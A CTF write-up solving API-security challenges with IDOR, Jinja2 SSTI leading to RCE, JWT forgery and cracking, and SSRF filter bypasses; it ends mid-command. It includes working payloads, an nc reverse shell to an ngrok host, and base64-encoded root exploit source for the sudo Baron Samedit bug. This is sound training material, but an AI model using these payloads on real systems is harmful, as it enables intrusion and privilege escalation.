
# Scoreboard

I was Team Kern(a)l2 with a total of 1045 points (10th place).

![](images/dashboard-1.png)
![](images/dashboard-2.png)
# Under Construction
## Start With the Basics 

### Points: 25

Looks like there is web app on the Target URL listed below, but the front end hasn’t been built. Maybe you can use the API to get some flags? The first one seems pretty simple... Target URL: [https://under-construction.chals.ctf.malteksolutions.com/](https://under-construction.chals.ctf.malteksolutions.com/ "https://under-construction.chals.ctf.malteksolutions.com/")

Navigating to the website, we see it is under construction and tells us about an `/api/docs` endpoint.

![](images/start-with-the-basics-1.png)

On this endpoint, we see there are a few endpoints that we can explore.

![](images/start-with-the-basics-1-2.png)

Looking at the register function, we see we need to send a POST request to `/api/register` and have the parameters in a form format.

![](images/start-with-the-basics-3.png)

```
curl -X POST https://under-construction.chals.ctf.malteksolutions.com/api/register \
-H "Content-Type: application/x-www-form-urlencoded" \
-d 'username=sec10splaya&password=testin123!'
```

Now that we have successfully create a user, we can log into the application.

```
curl -X POST https://under-construction.chals.ctf.malteksolutions.com/api/login \   
-H "Content-Type: application/x-www-form-urlencoded" \
-d 'username=sec10splaya&password=testin123!'
```

The response shows a success message and gives us a session token.

```
{"message":"success","session":"ea692712-41fd-41ea-9b7b-48151fe0ff56"} 
```

Using the session token, we can retrieve the flag.

```
curl -X GET https://under-construction.chals.ctf.malteksolutions.com/api/flag \ 
-H "Content-Type: application/x-www-form-urlencoded" \
-d 'username=sec10splaya&password=testin123!' \
-H "Authorization: Bearer ea692712-41fd-41ea-9b7b-48151fe0ff56"
```

Flag: apisec{nO_Br0w53r_N3Ed3d}

## Whose Note is it Anyways?

### Points: 100

Another flag has been hidden in the API. I can't remember where I hid it, I'll have to check my _notes_... Target URL: [https://under-construction.chals.ctf.malteksolutions.com/](https://under-construction.chals.ctf.malteksolutions.com/ "https://under-construction.chals.ctf.malteksolutions.com/")

Using the session token from [Start With the Basics](#start-with-the-basics), we can obtain the notes.

Using Burp Suite Intruder, we can craft a request and send 600 numbers incrementing by 1 to the server.

![](images/whose-note-is-it-anyways-1.png)
![](images/whose-note-is-it-anyways-2.png)

After Burp Suite Intruder finishes, we see that the flag is inside the response of note 479.

![](images/whose-note-is-it-anyways-3.png)

Flag: apisec{Th4t5_JuSt_IDORabl3}

# MuAPI

## Data Driven Discovery

### Points: 250

*I did not receive points for this challenge as it was solved after the competition concluded.*

Turns out that the pentest report was never actually read by the mages. Typical. But it's not like anyone can actually get into our system, right? The report was pretty vague. Target URL: [https://muapi.chals.ctf.malteksolutions.com/](https://muapi.chals.ctf.malteksolutions.com/)

Looking at the application, there is not much functionality.

![](images/data-driven-discovery-1.png)

There is a "Log In" and "Sign Up" page, each do not seem to be fruitful in anyway.

After bruteforcing directories, we stumble upon a `/api/v1/news` directory. It says that we are missing an API key.

![](images/data-driven-discovery-2.png)

Appending a `/help` onto the endpoint, we see that it reflects in the error message.

```
https://muapi.chals.ctf.malteksolutions.com/api/v1/news/help
```

![](images/data-driven-discovery-3.png)

Try various different injection types, we can see that Server-Side Template Injection (SSTI) worked!

```
https://muapi.chals.ctf.malteksolutions.com/api/v1/news/{{7*7}}
```

![](images/data-driven-discovery-4.png)

Using a basic SSTI payload, we receive Remote Code Execution (RCE).

```
https://muapi.chals.ctf.malteksolutions.com/api/v1/news/%7B%7B%20self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()%20%7D%7D
```

![](images/data-driven-discovery-5.png)

After some navigation on the server, we see there is a `flag.txt`.

```
https://muapi.chals.ctf.malteksolutions.com/api/v1/news/%7B%7B%20self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la ..').read()%20%7D%7D
```

![](images/data-driven-discovery-6.png)

We can retrieve the flag.

```
https://muapi.chals.ctf.malteksolutions.com/api/v1/news/%7B%7B%20self.__init__.__globals__.__builtins__.__import__('os').popen('cat ../flag.txt').read()%20%7D%7D
```

![](images/data-driven-discovery-7.png)

Flag: apisec{Y0U-G0T-RC3-223}

## Breaking Into Admin Territory

### Points: 150

*I did not receive points for this challenge as it was solved after the competition concluded.*

Check out the new music streaming service that the mages have been working on! IT said they had a pentest done, but we actually have no idea what the results were. It's probably fine though, right? Target URL: [https://muapi.chals.ctf.malteksolutions.com/](https://muapi.chals.ctf.malteksolutions.com/)

With the RCE from the previous challenge, we can start to look through some of the application files. Within the `app/api.py` directory, we see there is a `report.pdf` endpoint that requires a PIN from `current_app.config['DOWNLOAD_KEY']`.

```
https://muapi.chals.ctf.malteksolutions.com/api/v1/news/%7B%7B%20self.__init__.__globals__.__builtins__.__import__('os').popen('cat app/api.py').read()%20%7D%7D
```

![](images/breaking-into-admin-territory-1.png)

```python
@api_blueprint.route("/files/2882b66aafcf5233c61002810387fa97/report.pdf")
def download():
    filename = "report.pdf"
    pin = request.args.get("pin", None)
    if str(pin) == str(current_app.config["DOWNLOAD_KEY"]):
        return send_file(f"{os.getcwd()}/app/downloads/{filename}", as_attachment=True)
    elif pin:
        return "Invalid pin entered by application, enter your 4 digit pin"
    else:
        return "No pin entered by application, enter your 4 digit pin"
```

Doing a recursive grep search for the word `DOWNLOAD_KEY` reveals the PIN number.

```
https://muapi.chals.ctf.malteksolutions.com/api/v1/news/%7B%7B%20self.__init__.__globals__.__builtins__.__import__('os').popen('grep -r "DOWNLOAD_KEY"').read()%20%7D%7D
```

![](images/breaking-into-admin-territory-2.png)

We can perform a GET request and download the `report.pdf` file.

```
https://muapi.chals.ctf.malteksolutions.com/api/v1/files/2882b66aafcf5233c61002810387fa97/report.pdf?pin=2190
```

Within the report, we see that the flag is at the bottom.

![](images/breaking-into-admin-territory-3.png)

Flag: apisec{SQL-M45T3R-4-L1F3-381}

## Above and Beyond

### Points: 250

*I did not receive points for this challenge as it was solved after the competition concluded.*

We just got word that there's a privilege escalation vulnerability on the system running MuAPI! This was _just_ disclosed to us now. Perhaps someone can figure out what's going on?  
Target URL: [https://muapi.chals.ctf.malteksolutions.com/](https://muapi.chals.ctf.malteksolutions.com/)

 With the RCE, we can obtain a reverse shell and figure out how to privilege escalate.

This next part is with the help of [SloppyJoePirates CTF Writeups](https://www.youtube.com/@SloppyJoePirates). He showed me a way use `ngrok` to port forward and obtain a shell. This method requires an account on the [ngrok](ngrok.com/) website.

After you setup `ngrok` on Kali, we can start ngrok on port 4444.

```
ngrok tcp 4444
```

Within the ngrok window, you will see a section called `Forwarding`. An example is below.

```
Forwarding                    tcp://0.tcp.ngrok.io:12860 -> localhost:4444 
```

In a different terminal, setup a netcat listener on port 4444.

```
nc -lvnp 4444
```

We can obtain a reverse shell using the following URL:

```
https://muapi.chals.ctf.malteksolutions.com/api/v1/news/%7B%7B%20self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ngrok URL> <ngrok port> >/tmp/f').read()%20%7D%7D
```

After sending the request, we get a connection back.

![](images/above-and-beyond-1.png)


After stablizing a shell,. we see that the sudo version is `1.8.31`.

```
sudo -V
```

![](images/above-and-beyond-2.png)

We  also see that system is running Ubuntu 20.04 LTS (Focal Fossa).

```
cat /etc/os-release
```

![](images/above-and-beyond-3.png)

Looking up the sudo version, we see there is a vulnerability called Baron Samedit. Using [this github](https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit/tree/main), we can transfer the files to the server.

However, we cannot use the typical `wget` or `curl` because those are not installed on the system.

![](images/above-and-beyond-4.png)

Another way to transfer files is by base64 encoding each one.

```
# shellcode.c

echo "c3RhdGljIHZvaWQgX19hdHRyaWJ1dGVfXygoY29uc3RydWN0b3IpKSBfaW5pdCh2b2lkKSB7CiAgX19hc20gX192b2xhdGlsZV9fKAogICAgICAiYWRkcSAkNjQsICVyc3A7IgogICAgICAvLyBzZXR1aWQoMCk7CiAgICAgICJtb3ZxICQxMDUsICVyYXg7IgogICAgICAibW92cSAkMCwgJXJkaTsiCiAgICAgICJzeXNjYWxsOyIKICAgICAgLy8gc2V0Z2lkKDApOwogICAgICAibW92cSAkMTA2LCAlcmF4OyIKICAgICAgIm1vdnEgJDAsICVyZGk7IgogICAgICAic3lzY2FsbDsiCiAgICAgIC8vIGV4ZWN2ZSgiL2Jpbi9zaCIpOwogICAgICAibW92cSAkNTksICVyYXg7IgogICAgICAibW92cSAkMHgwMDY4NzMyZjZlNjk2MjJmLCAlcmRpOyIKICAgICAgInB1c2hxICVyZGk7IgogICAgICAibW92cSAlcnNwLCAlcmRpOyIKICAgICAgIm1vdnEgJDAsICVyZHg7IgogICAgICAicHVzaHEgJXJkeDsiCiAgICAgICJwdXNocSAlcmRpOyIKICAgICAgIm1vdnEgJXJzcCwgJXJzaTsiCiAgICAgICJzeXNjYWxsOyIKICAgICAgLy8gZXhpdCgwKTsKICAgICAgIm1vdnEgJDYwLCAlcmF4OyIKICAgICAgIm1vdnEgJDAsICVyZGk7IgogICAgICAic3lzY2FsbDsiKTsKfQo=" | base64 -d > shellcode.c

# exploit.c

echo "I2luY2x1ZGUgPHVuaXN0ZC5oPiAvLyBleGVjdmUoKQojaW5jbHVkZSA8c3RyaW5nLmg+IC8vIHN0cmNhdCgpCgovKiBFeHBsb2l0IGZvciBDVkUtMjAyMS0zMTU2LCBkcm9wcyBhIHJvb3Qgc2hlbGwuCiAqIEFsbCBjcmVkaXQgZm9yIG9yaWdpbmFsIHJlc2VhcmNoOiBRdWFseXMgUmVzZWFyY2ggVGVhbS4KICogaHR0cHM6Ly9ibG9nLnF1YWx5cy5jb20vdnVsbmVyYWJpbGl0aWVzLXJlc2VhcmNoLzIwMjEvMDEvMjYvY3ZlLTIwMjEtMzE1Ni1oZWFwLWJhc2VkLWJ1ZmZlci1vdmVyZmxvdy1pbi1zdWRvLWJhcm9uLXNhbWVkaXQKICoKICogVGVzdGVkIG9uIFVidW50dSAyMC4wNCBhZ2FpbnN0IHN1ZG8gMS44LjMxCiAqIEF1dGhvcjogTWF4IEthbXBlcgogKi8KCnZvaWQgbWFpbih2b2lkKSB7CgogICAgLy8gJ2J1Zicgc2l6ZSBkZXRlcm1pbmVzIHNpemUgb2Ygb3ZlcmZsb3dpbmcgY2h1bmsuCiAgICAvLyBUaGlzIHdpbGwgYWxsb2NhdGUgYW4gMHhmMC1zaXplZCBjaHVuayBiZWZvcmUgdGhlIHRhcmdldCBzZXJ2aWNlX3VzZXIgc3RydWN0LgogICAgaW50IGk7CiAgICBjaGFyIGJ1ZlsweGYwXSA9IHswfTsKICAgIG1lbXNldChidWYsICdZJywgMHhlMCk7CiAgICBzdHJjYXQoYnVmLCAiXFwiKTsKCiAgICBjaGFyKiBhcmd2W10gPSB7CiAgICAgICAgInN1ZG9lZGl0IiwKICAgICAgICAiLXMiLAogICAgICAgIGJ1ZiwKICAgICAgICBOVUxMfTsKCiAgICAvLyBVc2Ugc29tZSBMQ18gdmFycyBmb3IgaGVhcCBGZW5nLVNodWkuCiAgICAvLyBUaGlzIHNob3VsZCBhbGxvY2F0ZSB0aGUgdGFyZ2V0IHNlcnZpY2VfdXNlciBzdHJ1Y3QgaW4gdGhlIHBhdGggb2YgdGhlIG92ZXJmbG93LgogICAgY2hhciBtZXNzYWdlc1sweGUwXSA9IHsiTENfTUVTU0FHRVM9ZW5fR0IuVVRGLThAIn07CiAgICBtZW1zZXQobWVzc2FnZXMgKyBzdHJsZW4obWVzc2FnZXMpLCAnQScsIDB4YjgpOwoKICAgIGNoYXIgdGVsZXBob25lWzB4NTBdID0geyJMQ19URUxFUEhPTkU9Qy5VVEYtOEAifTsKICAgIG1lbXNldCh0ZWxlcGhvbmUgKyBzdHJsZW4odGVsZXBob25lKSwgJ0EnLCAweDI4KTsKCiAgICBjaGFyIG1lYXN1cmVtZW50WzB4NTBdID0geyJMQ19NRUFTVVJFTUVOVD1DLlVURi04QCJ9OwogICAgbWVtc2V0KG1lYXN1cmVtZW50ICsgc3RybGVuKG1lYXN1cmVtZW50KSwgJ0EnLCAweDI4KTsKCiAgICAvLyBUaGlzIGVudmlyb25tZW50IHZhcmlhYmxlIHdpbGwgYmUgY29waWVkIG9udG8gdGhlIGhlYXAgYWZ0ZXIgdGhlIG92ZXJmbG93aW5nIGNodW5rLgogICAgLy8gVXNlIGl0IHRvIGJyaWRnZSB0aGUgZ2FwIGJldHdlZW4gdGhlIG92ZXJmbG93IGFuZCB0aGUgdGFyZ2V0IHNlcnZpY2VfdXNlciBzdHJ1Y3QuCiAgICBjaGFyIG92ZXJmbG93WzB4NTAwXSA9IHswfTsKICAgIG1lbXNldChvdmVyZmxvdywgJ1gnLCAweDRjZik7CiAgICBzdHJjYXQob3ZlcmZsb3csICJcXCIpOwoKICAgIC8vIE92ZXJ3cml0ZSB0aGUgJ2ZpbGVzJyBzZXJ2aWNlX3VzZXIgc3RydWN0J3MgbmFtZSB3aXRoIHRoZSBwYXRoIG9mIG91ciBzaGVsbGNvZGUgbGlicmFyeS4KICAgIC8vIFRoZSBiYWNrc2xhc2hlcyB3cml0ZSBudWxscyB3aGljaCBhcmUgbmVlZGVkIHRvIGRvZGdlIGEgY291cGxlIG9mIGNyYXNoZXMuCiAgICBjaGFyKiBlbnZwW10gPSB7CiAgICAgICAgb3ZlcmZsb3csCiAgICAgICAgIlxcIiwgIlxcIiwgIlxcIiwgIlxcIiwgIlxcIiwgIlxcIiwgIlxcIiwgIlxcIiwKICAgICAgICAiWFhYWFhYWFxcIiwKICAgICAgICAiXFwiLCAiXFwiLCAiXFwiLCAiXFwiLCAiXFwiLCAiXFwiLCAiXFwiLCAiXFwiLAogICAgICAgICJcXCIsICJcXCIsICJcXCIsICJcXCIsICJcXCIsICJcXCIsICJcXCIsCiAgICAgICAgIngveFxcIiwKICAgICAgICAiWiIsCiAgICAgICAgbWVzc2FnZXMsCiAgICAgICAgdGVsZXBob25lLAogICAgICAgIG1lYXN1cmVtZW50LAogICAgICAgIE5VTEx9OwoKICAgIC8vIEludm9rZSBzdWRvZWRpdCB3aXRoIG91ciBhcmd2ICYgZW52cC4KICAgIGV4ZWN2ZSgiL3Vzci9iaW4vc3Vkb2VkaXQiLCBhcmd2LCBlbnZwKTsKfQo=" | base64 -d > exploit.c

# Makefile

echo "YWxsOiBzaGVsbGNvZGUgZXhwbG9pdAoKc2hlbGxjb2RlOiBzaGVsbGNvZGUuYwoJbWtkaXIgbGlibnNzX3gKCSQoQ0MpIC1PMyAtc2hhcmVkIC1ub3N0ZGxpYiAtbyBsaWJuc3NfeC94LnNvLjIgc2hlbGxjb2RlLmMKCmV4cGxvaXQ6IGV4cGxvaXQuYwoJJChDQykgLU8zIC1vIGV4cGxvaXQgZXhwbG9pdC5jCgpjbGVhbjoKCXJtIC1yZiBsaWJuc3NfeCBleHBsb2l0Cg==" | base64 -d > Makefile
```

Now that we have all the files we need, we can run the `make` command, which will make an exploit binary.

![](images/above-and-beyond-5.png)

Lastly, we can run the `exploit` binary, and obtain a shell as root. The flag is in the `/root/flag.txt` file.

![](images/above-and-beyond-6.png)

Flag: apisec{N0W-Y0U-G0T-R00T-995}
# Insecure Runes 

## Insecure Runes

### Points: 200

It looks like the orc devs are back to working for the mages! Unfortunately some of the mages are complaining about rune references being mixed up? It's been said that there's a secret way to access the flag, but we've yet to find it. Target URL: [https://insecure-runes.chals.ctf.malteksolutions.com/](https://insecure-runes.chals.ctf.malteksolutions.com/ "https://insecure-runes.chals.ctf.malteksolutions.com/")

Going to the URL, we see there are a few endpoints we can look at.

![](images/insecure-runes-1.png)

Using the POST request, we can see what responses we get. First we will try the `7*7` payload.

```
curl -X POST https://insecure-runes.chals.ctf.malteksolutions.com/rune/create \
-H "Content-Type: application/json" \
-d '{"Rune": "7*7"}'
```

![](images/insecure-runes-2.png)

Since it returns 49, we know that it is doing some sort of calculation on the backend. In an attempt to see if it is python, we can run `__file__`.

```
curl -X POST https://insecure-runes.chals.ctf.malteksolutions.com/rune/create \
-H "Content-Type: application/json" \
-d '{"Rune": "__file__"}'
```

![](images/insecure-runes-3.png)

Knowing this, we can assume that it is an SSTI, or something similar to SSTI. However, after enumerating all functions, SSTI did not appear to be the answer since there was a character limit of 20. Trying to type `flag` resulted in a different response.

```
curl -X POST https://insecure-runes.chals.ctf.malteksolutions.com/rune/create \
-H "Content-Type: application/json" \
-d '{"Rune": "flag"}' 
```

![](images/insecure-runes-4.png)

Seeing this, that means we will need to bypass the restriction to see the flag. We can add an `@` which will get removed since it is a special character in Linux command line. From there, we obtained the flag.

```
curl -X POST https://insecure-runes.chals.ctf.malteksolutions.com/rune/create \
-H "Content-Type: application/json" \
-d '{"Rune": "f@lag"}'
```

![](images/insecure-runes-5.png)

This can also be done by running the `globals()` function.

```
curl -X POST https://insecure-runes.chals.ctf.malteksolutions.com/rune/create \
-H "Content-Type: application/json" \
-d '{"Rune": "globals()"}'
```

![](images/insecure-runes-6.png)

Flag: apisec{tH3_d3v5_aR3_0rC5}

# Ent Gardening
## JWT Germinator  

### Points: 50

Sauron has tasked you with taking care of an ent for the upcoming war. Use the API to monitor it's growth. Sauron will only reward you when your ent has finished growing.

Target URL: [https://ent-gardening-1.chals.ctf.malteksolutions.com/](https://ent-gardening-1.chals.ctf.malteksolutions.com/)

Going to the website, we see there are a few endpoints we can explore.

![](images/jwt-germinator-1.png)

We can first obtain a "seed" from the `/ent/get_seed` endpoint.

```
curl -X POST https://ent-gardening-1.chals.ctf.malteksolutions.com/ent/get_seed
```

In the response, we retrieve a `Seed_Token`.

```
{"Seed_Token":"b'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJOYW1lIjoiUmljaGFyZCBDYXNoIiwiVGltZV9MZWZ0X0luX1llYXJzIjoiODAwMDAwMCJ9.'"}
```

Taking the second part of the JWT, we can base64 decode it.

```
echo "eyJOYW1lIjoiUmljaGFyZCBDYXNoIiwiVGltZV9MZWZ0X0luX1llYXJzIjoiODAwMDAwMCJ9" | base64 -d
```

This results in the following cleartext.

```
{"Name":"Richard Cash","Time_Left_In_Years":"8000000"}
```

Taking this, we can modify it and set `Time_Left_In_Years` to `0`.

```
echo '{"Name":"Richard Cash","Time_Left_In_Years":"0"}' | base64
```

Now we get the following:

```
eyJOYW1lIjoiUmljaGFyZCBDYXNoIiwiVGltZV9MZWZ0X0luX1llYXJzIjoiMCJ9Cg==
```

Merging the new payload with the header, we get the following JWT.

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJOYW1lIjoiUmljaGFyZCBDYXNoIiwiVGltZV9MZWZ0X0luX1llYXJzIjoiMCJ9Cg==.
```

Using this, we can send a POST request to the `/ent/check_seed` and retrieve the flag.

```
curl -X POST https://ent-gardening-1.chals.ctf.malteksolutions.com/ent/check_seed -d '{"Seed_Token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJOYW1lIjoiUmljaGFyZCBDYXNoIiwiVGltZV9MZWZ0X0luX1llYXJzIjoiMCJ9Cg==."}' -H 'Content-Type: application/json'
```

![](images/jwt-germinator-2.png)


Flag: apisec{H0wD_ThAt_Gr0W_5o_Fa5T}

## JWT Arborist  

### Points: 75

Sauron is unhappy with those who have found a way to bypass the expected waiting time for their ent to properly mature. There has been a new API released for use, which has added security measures. Do not dissapoint him again. Target URL: [https://ent-gardening-2.chals.ctf.malteksolutions.com/](https://ent-gardening-2.chals.ctf.malteksolutions.com/)

The endpoints are the same as the previous challenge.

We can retrieve a seed token from the `/ent/get_seed` endpoint.

```
curl -X POST https://ent-gardening-2.chals.ctf.malteksolutions.com/ent/get_seed          
```

![](images/jwt-arborist-1.png)

```
{"Seed_Token":"b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJOYW1lIjoiQ2FybG9zIENvbGUiLCJUaW1lX0xlZnRfSW5fWWVhcnMiOiI4MDAwMDAwIn0.E4RZZ8QjaBifK4skVn6SR1Kssi1HOERgIxVqNleeUKw'"}
```

When we try to modify the JWT just like the one from [JWT Germinator](#jwt-germinator), we get a "Signature verification failed" error message.

![](images/jwt-arborist-2.png)

Using hashcat, we can bruteforce the signature.

```
hashcat -a 0 -m 16500 jwt /usr/share/wordlists/rockyou.txt
```

![](images/jwt-arborist-3.png)

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJOYW1lIjoiSmFuaXMgTGVlIiwiVGltZV9MZWZ0X0luX1llYXJzIjoiODAwMDAwMCJ9.tViW_WZJ0hP09EYuoTTIFLNneMh2cW0_j11mfNYLLVU:december30
```

Using [JWT.io](https://jwt.io), we can insert the signature and modify the JWT, setting the `Time_Left_In_Years` to `0`.

![](images/jwt-arborist-4.png)

Accessing the `/ent/check_seed` endpoint, we can retrieve the flag.

```
curl -X POST https://ent-gardening-2.chals.ctf.malteksolutions.com/ent/check_seed -d '{"Seed_Token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJOYW1lIjoiQ2FybG9zIENvbGUiLCJUaW1lX0xlZnRfSW5fWWVhcnMiOiIwIn0.P4ib4Q5siD-7kCmubjKpnEfJeB05Pfrddkhviiq6gow"}' -H 'Content-Type: application/json'
```

![](images/jwt-arborist-5.png)

Flag: apisec{4r3_y0u_4_t1m3_tr4v3ll3r}

## Garden of Tokens

### Points: 100

*I did not receive points for this challenge as it was solved after the competition concluded.*

Apparently you can't be trusted to properly care for these ents. Therefore we are now tracking all ent data centrally. You can only retrieve your flag once your ent has sufficiently matured. Target URL: [https://ent-gardening-3.chals.ctf.malteksolutions.com/](https://ent-gardening-3.chals.ctf.malteksolutions.com/)

Looking at the homepage, we see a few interesting endpoints.

![](images/garden-of-tokens-1.png)

We can take a look at all the seeds on the API.

```
curl -X GET https://ent-gardening-3.chals.ctf.malteksolutions.com/ent/seeds -s | jq
```

![](images/garden-of-tokens-2.png)

We can POST to `/ent/seed/new` which reveals the `seed_token`, for each name even though the plant exists. Looking at the `Jonathan Monroe` plant, we see that the JWT has `Time_Left_In_Years` set to `-14`.

```
curl -X POST -s https://ent-gardening-3.chals.ctf.malteksolutions.com/ent/seed/new -d '{"name":"Jonathan Monroe"}' -H "Content-Type: application/json"
```

```
{"error":"Plant already exists!","seed_token":"b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJOYW1lIjoiSm9uYXRoYW4gTW9ucm9lIiwicGxhbnRlZF9kYXRlIjoyMDAwLCJUaW1lX0xlZnRfSW5fWWVhcnMiOi0xNH0.tN_oSm0dsxhCi8lGD9E_O0uCeiq76Tjec884PK6DuDs'"}
```


![](images/garden-of-tokens-3.png)

Knowing this, we can POST to `/ent/seed/check` using the `seed_token` and retrieve the flag.

```
curl -X POST -s https://ent-gardening-3.chals.ctf.malteksolutions.com/ent/seed/check -d '{"Seed_Token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJOYW1lIjoiSm9uYXRoYW4gTW9ucm9lIiwicGxhbnRlZF9kYXRlIjoyMDAwLCJUaW1lX0xlZnRfSW5fWWVhcnMiOi0xNH0.tN_oSm0dsxhCi8lGD9E_O0uCeiq76Tjec884PK6DuDs"}' -H "Content-Type: application/json"
```

![](images/garden-of-tokens-4.png)

Flag: apisec{th4nk_y0u_f0r_y0ur_3ff0rt5_1n_h3lping_0ur_g4rd3n_grow}

---

# Sauron's Firewall

## Come @ me, Sauron!

### Points: 75

Sauron is pretty against his orcs using social media which is why he ONLY allows them to use [http://sauron.com](http://sauron.com/). Only there, does he allow his flags to be sent. Can you find a way to retrieve the flag? Target URL: [https://saurons-firewall-1.chals.ctf.malteksolutions.com/](https://saurons-firewall-1.chals.ctf.malteksolutions.com/)

Looking at the home page, we see there is one endpoint that we will need to look at.

![](images/come-at-me-sauron-1.png)

When we try to access `http://sauron.com`, we retrieve an error message.

![](images/come-at-me-sauron-2.png)

```
curl -X POST https://saurons-firewall-1.chals.ctf.malteksolutions.com/proxy \
-H "Content-Type: application/json" \
-d '{"url": "http://sauron.com"}'
```

```
{"error":"Invalid URL or no response!"}
```

This attack requires Out-of-Band (OOB) knowledge. Since some people do not have Burp Suite Collaborator, we can use [InteractSH](https://github.com/projectdiscovery/interactsh?tab=readme-ov-file#usage). After starting interactsh, we can send the request to the host provided by interactsh and retrieve the flag.

```
./interactsh-client -v -http-only
```

```
curl -X POST -H "Content-Type: application/json" -d '{"url": "http://sauron.com@cp79aisahse4lmm955rgbpfwtzdjbrjca.oast.fun"}' https://saurons-firewall-1.chals.ctf.malteksolutions.com/proxy
```

![](images/come-at-me-sauron-3.png)

Flag: apisec{Th3_eYe_d1Dn't_Se3_Th15_c0M1nG}

## Bypass the Dark Lord's Firewall

### Points: 100

*I did not receive points for this challenge as it was solved after the competition concluded.*

Sauron is still adamant about restricting his orcs' social media usage, allowing them access only to [http://sauron.com](http://sauron.com/). Only to this domain will he securely transmit his flags. He found out about your little "@" trick, so don't think about using that again! Target URL: [https://saurons-firewall-2.chals.ctf.malteksolutions.com/](https://saurons-firewall-2.chals.ctf.malteksolutions.com/)

Since we cannot use the @ sign. we can try making the `http://sauron.com` a subdomain of our interactsh instance. We see that we get a connection back which reveals the flag.

```
curl -X POST https://saurons-firewall-1.chals.ctf.malteksolutions.com/proxy \
-H "Content-Type: application/json" \
-d '{"url": "http://sauron.com.cp79rmcahse131cjbda0xr6ef787je3ox.oast.fun"}'
```

![](images/bypass-the-dark-lords-firewall-1.png)

Flag: apisec{Th3_eYe_d1Dn't_Se3_Th15_c0M1nG}

## Sauron's Last Stand

### Points: 125

*I did not receive points for this challenge as it was solved after the competition concluded.*

Sauron's grip on his orcs' internet access remains tight, limiting them solely to [http://sauron.com/](http://sauron.com/) for all communications. His security measures have grown even more sophisticated. Do you have what it takes to penetrate his enhanced defenses and capture the flag?  
Target URL: [https://saurons-firewall-3.chals.ctf.malteksolutions.com/](https://saurons-firewall-3.chals.ctf.malteksolutions.com/)

Looking at the previously 2 challenges, the error message continue to say the URL required `http://sauron.com`, but with this challenge, it gives a different error message.

```
curl -X POST https://saurons-firewall-3.chals.ctf.malteksolutions.com/proxy \
-H "Content-Type: application/json" \
-d '{"url": "http://sauron.com"}' 
```

![](images/saurons-last-stand-1.png)

The first thing that stands out is it is looking for an appended backlash at the end of the URL: `http://sauron.com/`

With this, we can try to add the interactsh payload before the Sauron domain and see what it returns.

```
curl -X POST https://saurons-firewall-3.chals.ctf.malteksolutions.com/proxy \
-H "Content-Type: application/json" \
-d '{"url": "http://cp7jt3sahsecg1ekgdugj8eq98a4ey7xo.oast.site/http://sauron.com/"}'
```

![](images/saurons-last-stand-2.png)

Looking at the GET request on interactsh, we see that the pointed URL is missing a `/`.

![](images/saurons-last-stand-3.png)

In an attempt to bypass the backlash filter, we can append another backlash to the end of the Sauron domain, and see we can retrieve the flag.

```
curl -X POST https://saurons-firewall-3.chals.ctf.malteksolutions.com/proxy \
-H "Content-Type: application/json" \
-d '{"url": "http://cp7jt3sahsecg1ekgdugj8eq98a4ey7xo.oast.site/http://sauron.com//"}'
```

![](images/saurons-last-stand-4.png)

![](images/saurons-last-stand-5.png)

Flag: apisec{th35e_F1lt3r5_4r3_4_j0k3}

---
# Blogger

## Role Reversal
 
### Points: 100

Check out our new blog! Well, the API at least! Now featuring draft posts. We think it's pretty secure, so we've added a special flag in the admin account that only other admins are able to see.

Target URL: [https://blogger.chals.ctf.malteksolutions.com/](https://blogger.chals.ctf.malteksolutions.com/)

On the main page, there is nothing, which means there needs to be an API somewhere. Using common words like `api`, `v1`, `v2`, `docs`, we stumble upon a FastAPI on the `/docs` endpoint.

![](images/role-reversal-1.png)

We see there is a signup endpoint, so we will create a user.

```
curl -X 'POST' \
  'https://blogger.chals.ctf.malteksolutions.com/signup' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "email": "testing@test.com",
  "password": "password",
  "first_name": "John",
  "last_name": "Doe"
}'
```

![](images/role-reversal-2.png)

Now we can log into the API and retrieve a session.

```
curl -X 'POST' \
  'https://blogger.chals.ctf.malteksolutions.com/login' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "email": "testing@test.com",
  "password": "password"
}'
```

![](images/role-reversal-3.png)

```
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RpbmdAdGVzdC5jb20iLCJmaXJzdF9uYW1lIjoiSm9obiIsImxhc3RfbmFtZSI6IkRvZSIsInJvbGUiOiJ1c2VyIiwiZXhwaXJlcyI6MTcxNjQyNTAxNS4xMTQ2ODY3fQ._Ua_mpkrOnoQayFrTyx6g8yC2Q5y92jkhG1VaM-EHIA"} 
```

Using this access token, we can view other users on the application. So, we try to look at the userID 1 and see that it is the administrator.

```
curl -X 'GET' \
  'https://blogger.chals.ctf.malteksolutions.com/users/1' \
  -H 'accept: application/json' \
-H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RpbmdAdGVzdC5jb20iLCJmaXJzdF9uYW1lIjoiSm9obiIsImxhc3RfbmFtZSI6IkRvZSIsInJvbGUiOiJ1c2VyIiwiZXhwaXJlcyI6MTcxNjQyNTAxNS4xMTQ2ODY3fQ._Ua_mpkrOnoQayFrTyx6g8yC2Q5y92jkhG1VaM-EHIA'
```

![](images/role-reversal-4.png)

Looking at all the different values within the response, we see there is a `role` parameter. On our user that we are signed in, our role value is set to `user`.

```
curl -X 'GET' \
  'https://blogger.chals.ctf.malteksolutions.com/users/me' \
  -H 'accept: application/json' \
